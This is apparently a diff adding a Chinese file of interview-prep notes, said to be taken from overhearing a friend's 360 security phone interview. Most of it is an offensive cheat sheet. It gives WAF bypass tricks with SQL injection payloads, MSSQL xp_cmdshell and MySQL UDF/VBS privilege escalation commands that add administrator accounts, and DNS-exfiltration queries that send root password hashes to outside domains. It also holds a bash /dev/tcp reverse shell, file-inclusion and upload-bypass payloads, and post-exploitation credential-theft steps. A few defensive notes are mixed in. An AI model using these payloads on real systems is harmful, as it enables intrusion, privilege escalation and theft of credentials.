@@ -1,0 +1,258 @@
+360面试题，有点乱，电话面试我朋友，我听着记下的
+
+代码审计:
+eval
+preg_replace+/e
+assert
+call_user_func
+call_user_func_array
+create_function
+
+文件读取：
+file_get_contents()
+highlight_file()
+fopen()
+read file()
+fread()
+fgetss(),
+fgets()
+parse_ini_file()
+show_source()
+file()
+
+命令执行：
+system()
+exec()
+shell_exec(),
+passthru()
+pcntl_exec(),
+popen()
+proc_open()
+
+绕过WAF
+1、关键字可以用%（只限IIS系列）。比如select，可以sel%e%ct。原理：网络层waf对SEL%E%CT进行url解码后变成SEL%E%CT，匹配select失败，而进入asp.dll对SEL%E%CT进行url解码却变成select。
+IIS下的asp.dll文件在对asp文件后参数串进行url解码时，会直接过滤掉09-0d（09是tab键,0d是回车）、20（空格）、%(后两个字符有一个不是十六进制)字符。xss也是同理。
+2、通杀的，内联注释。安全狗不拦截，但是安全宝、加速乐、D盾等，看到/*!/就Fack了，所以只限于安全狗。比如：/*!select*/
+3、编码。这个方法对waf很有效果，因为一般waf会解码，但是我们利用这个特点，进行两次编码，他解了第一次但不会解第二次，就bypass了。腾讯waf、百度waf等等都可以这样bypass的。
+4，绕过策略一：伪造搜索引擎
+早些版本的安全狗是有这个漏洞的，就是把User-Agent修改为搜索引擎
+5，360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截
+GET /pen/news.php?id=1 union select user,password from mysql.user
+GET /pen/news.php/admin?id=1 union select user,password from mysql.user
+GET /pen/admin/..\news.php?id=1 union select user,password from mysql.user
+6，multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF。
+7，参数绕过，复制参数，id=1&id=1
+用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗，在sqlserver中可以用/**/代替空格
+8,内联注释，文件上传，复制文件包一份再加一份,在 form-data;后面增加一定的字符
+
+宽字符注入
+解决方法：就是在初始化连接和字符集之后，使用SET character_set_client=binary来设定客户端的字符集是二进制的。修改Windows下的MySQL配置文件一般是 my.ini，Linux下的MySQL配置文件一般是my.cnf，比如：mysql_query("SET character_set_client=binary");。character_set_client指定的是SQL语句的编码，如果设置为binary，MySQL就以二进制来执行，这样宽字节编码问题就没有用武之地了。
+
+oracle注入
+【漏洞名称】 sys.dbms_export_extension.get_domain_index_metadata 提升权限漏洞
+【影响平台】Oracle 8i / 9i / 10g / XE
+【风险等级】高【攻击需求】较低权限账号
+【造成危害】取得管理员权限
+
+mysql4和mysql5的区别
+mysql 5.0,增加了infomaction数据库，存储过程，视图，
+
+xss 挂马，ddos攻击，csrf
+htmlspecialchars将与、单双引号、大于和小于号格式化成HTML格式
+htmlentities() 所有字符都转成实体，strip_tags 去掉HTML和php标记
+
+mssql提权
+首先看看xp_cmdshell存在不,不存在的话先恢复下。
+Exec sp_configure show advanced options,1;RECONFIGURE;EXEC sp_configure xp_cmdshell,1;RECONFIGURE;
+;EXEC sp_configure show advanced options, 1;RECONFIGURE;EXEC sp_configure xp_cmdshell, 1;RECONFIGURE;--
+如果cmdshell还不行的话，就再运行：;dbcc addextendedproc("xp_cmdshell","xplog70.dll");--
+或者;sp_addextendedproc xp_cmdshell,@dllname=xplog70.dll来恢复cmdshell。
+无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
+恢复方法：查询分离器连接后,
+第一步执行:exec sp_dropextendedproc xp_cmdshell
+第二步执行:exec sp_addextendedproc xp_cmdshell,xpweb70.dll
+然后按F5键命令执行完毕
+
+四.终极方法.
+如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
+查询分离器连接后,
+2000servser系统:
+declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net user dell huxifeng007 /add
+declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net localgroup administrators dell /add
+
+一次windows2008的提权过程
+http://www.freebuf.com/articles/web/10280.html
+ps:(这可能是被喷的最厉害的一篇文章了)
+
+第一种函数
+select name from sysobjects where xtype=u  通过这个来爆第一个表
+select name from sysobjects where xtype=u and name not in(爆出来的表1，爆出来的表2...)
+一直爆下去，直到找到我们所需要的表位置
+第二种函数
+select table_name from information_schema.tables
+select table_name from information_schema.tables where table_name not in (爆出来的表1，爆出来的表2...)。
+
+
+
+******【【【【【【【MYSQL提权】】】------------------------------
+一 UDF提权 
+这类提权方法我想大家已经知道了，我大致写一下，具体语句如下： 
+create function cmdshell returns string soname ’udf.dll’   
+select cmdshell(’net user iis_user 123!@#abcABC /add’);   
+select cmdshell(’net localgroup administrators iis_user /add’);   
+select cmdshell(’regedit /s d:web3389.reg’);   
+drop function cmdshell;   
+select cmdshell(’netstat -an’); 
+
+二 VBS启动项提权 
+create table a (cmd text);  
+insert into a values ("set wshshell=createobject (""wscript.shell"") " );  
+insert into a values ("a=wshshell.run (""cmd。exe /c net user iis_user 123!@#abcABC/add"",0) " );  
+insert into a values ("b=wshshell.run (""cmd。exe /c net localgroup administrators iis_user /add"",0) " );  
+select * from a into outfile "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.vbs"; 
+
+三 Linx MySQL BackDoor提权 
+Linx Mysql Door 
+Mysql BackDoor是一款针对PHP+Mysql服务器开发的后门,该后门安装后为Mysql增加一个可以执行系统命令的"state"函数,并且随Mysql进程启动一个基于Dll的嗅探型后门,这个后门在Windows下拥有与Mysql一样的系统权限,从而巧妙的实现了无端口,无进程,无服务的穿墙木马. 
+用法：将Mysql.php传到PHP服务器上,点击"自动安装Mysql BackDoor"，然后直接执行命令即可  
+
+四，MIX.DLL提权 
+http://www.freebuf.com/vuls/85021.html
+1，在独立IP的sqlmap下运
+2，禁用本地缓存 net stop dns
+3，http://localhost/inject.php?user=123' and if((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT hex(user())),'.abc.com\\foobar'))),1,1)%23
+http://localhost/inject.php?user=123' and if((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT concat(user,'_',mid(password,2,41)) from user where user='root' limit 1),'.md5crack.cn\\foobar'))),1,1)%23
+https://sanwen8.cn/p/1acWt8J.html   DNS突破
+
+SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统
+
+SSRF统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态
+2.限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等
+3.黑名单内网IP。
+4.禁用不需要的协议，仅仅允许HTTP和HTTPS.
+
+反弹shell   
+公网服务器执行 nc –lvv 8888
+目标服务器上执行?cmd= bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
+
+在disabl_functions中禁用任意文件下载，限制php.ini open_basedir 限定文件的访问范围
+
+文件包含漏洞
+配合文件上传漏洞GetShell• 可以执行任意脚本代码 • 网站源码文件以及配置文件泄露• 远程包含GetShell• 控制整个网站甚至是服务器
+allow_url_fopen和allow_url_include为ON的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞
+/etc/passwd%00 • 需要 magic_quotes_gpc=off,PHP小于5.3.4有效
+• /etc/passwd././././././././././././.[......]/././././././././.
+• php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256
+index.php?page=php://filter/read/=convert.base64-encode/resource=index.php
+
+文件上传，js检测，MIME类型检测Content-Type,文件内容，服务端目录
+通过抓包截断将 eval.php.jpg 换成 eval.php_jpg(下划线为0x00)。在上传文件时系统文件遇到0x00。会认为文件已经结束。从而将eval.php.jpg的内容写入到eval.php中。
+
+htaccess文件内容
+<FilesMatch “haha”>
+SetHandler application/x-httpd-php
+</FileMatch>
+
+文件幻数检测 jpg(JFIF) gif(GIF89a) png(%PNG)
+apache解析漏洞，2.0-2.2 IIS7.5解析漏洞，任意文件名后加.php
+nginx<0.8.32 1.jpg/1.php  
+nginx>0.8.41<1.5.6,1.jpg%20%00.php解析
+
+and extractvalue(1, concat(0x7e,(select @@version),0x7e))
+1、通过floor报错 向下取整
++and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
+4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+10.exp()select * from test where id=1 and exp(~(select * from(select user())a));
+if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)
+addslashes() 函数返回在预定义字符之前添加反斜杠的字符串
+
+SQL注入（Sql Injection ）是一种将SQL语句插入或添加到应用(用户)的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行
+
+
+各种注释
+#-- -- - --+ // /**/ 空白字符，+, -, ~, !, @, {}, %0a
+
+域和组的区别
+工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。为什么是这样的呢？因为在加入域的时候，管理员为每个计算机在域中（可和用户不在同一域中）建立了一个计算机帐户，这个帐户和用户帐户一样，也有密码保护的。可是大家要问了，我没有输入过什么密码啊，是的，你确实没有输入，计算机帐户的密码不叫密码，在域中称为登录凭据，它是由2000的DC（域控制器）上的KDC服务来颁发和维护的。为了保证系统的安全，KDC服务每30天会自动更新一次所有的凭据，并把上次使用的凭据记录下来。周而复始。也就是说服务器始终保存着2个凭据，其有效时间是60天，60天后，上次使用的凭据就会被系统丢弃。如果你的GHOST备份里带有的凭据是60天的，那么该计算机将不能被KDC服务验证，从而系统将禁止在这个计算机上的任何访问请求（包括登录），解决的方法呢，简单的方法使将计算机脱离域并重新加入，KDC服务会重新设置这一凭据。或者使用2000资源包里的NETDOM命令强制重新设置安全凭据。因此在有域的环境下，请尽量不要在计算机加入域后使用GHOST备份系统分区，如果作了，请在恢复时确认备份是在60天内作的，如果超出，就最好联系你的系统管理员，你可以需要管理员重新设置计算机安全凭据，否则你将不能登录域环境。
+
+域和工作组适用的环境不同，域一般是用在比较大的网络里，工作组则较小，在一个域中需要一台类似服务器的计算机，叫域控服务器，其他电脑如果想互相访问首先都是经过它的，但是工作组则不同，在一个工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的，但是和域一样，如果一台计算机想访问其他计算机的话首先也要找到这个组中的一台类似组控服务器，组控服务器不是固定的，以选举的方式实现，它存储着这个组的相关信息，找到这台计算机后得到组的信息然后访问。
+
+提权
+systeminfo 查看修补补丁
+
+查看未修补的补丁编号
+KB952004 MS09-012        PR    -pr.exe
+KB956572 MS09-012        巴西烤肉
+KB970483 MS09-020        IIS6溢出     -iis6.exe
+LPK劫持                  -lpk.dll
+
+windows 2003>>systeminfo>C:\Windows\Temp\temp.txt&(for %i in (KB3057191 KB2840221 KB3000061 KB2850851 KB2711167 KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665 KB2592799 KB956572 KB977165 KB2621440) do @type C:\Windows\Temp\temp.txt| @find /i "%i"|| @echo %i Not Installed!)&del /f /q /a C:\Windows\Temp\temp.txt
+
+通用型>>systeminfo > C:\Windows\Temp\temp.txt&(for %i in (KB3124280 KB3143141 KB3134228 KB3079904 KB3077657 KB3124280 KB3045171 KB2829361 KB3000061 KB2850851 KB2707511 KB970483 KB2124261 KB2271195) do @type C:\Windows\Temp\temp.txt|@find /i "%i"|| @echo %i Not Installed!)&del /f /q /a C:\Windows\Temp\temp.txt
+接下来可以
+修改管理员密码
+创建一个新用户 添加到管理员组
+提取当前登录用户密码  （Getpass.exe）
+修改帮助账号（SUPPOTR_338945a0）的密码，并添加管理员组 (比较不容易被发现，推荐使用)
+提取用户密码哈希值（wce.exe）
+
+可运用的sql函数&关键字：
+MySQL：
+union distinct
+union distinctrow
+procedure analyse()
+updatexml()
+extracavalue()
+exp()
+ceil()
+atan()
+sqrt()
+floor()
+ceiling()
+tan()
+rand()
+sign()
+greatest()
+字符串截取函数
+Mid(version(),1,1)
+Substr(version(),1,1)
+Substring(version(),1,1)
+Lpad(version(),1,1)
+Rpad(version(),1,1)
+Left(version(),1)
+reverse(right(reverse(version()),1)
+字符串连接函数
+concat(version(),'|',user());
+concat_ws('|',1,2,3)
+字符转换
+Char(49)
+Hex('a')
+Unhex(61)
+过滤了逗号
+(1)limit处的逗号：
+limit 1 offset 0
+(2)字符串截取处的逗号
+mid处的逗号：
+mid(version() from 1 for 1)
+MSSQL：
+IS_SRVROLEMEMBER()
+IS_MEMBER()
+HAS_DBACCESS()
+convert()
+col_name()
+object_id()
+is_srvrolemember()
+is_member()
+字符串截取函数
+Substring(@@version,1,1)
+Left(@@version,1)
+Right(@@version,1)
+(2)字符串转换函数
+Ascii('a') 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass
+Char('97')
+exec
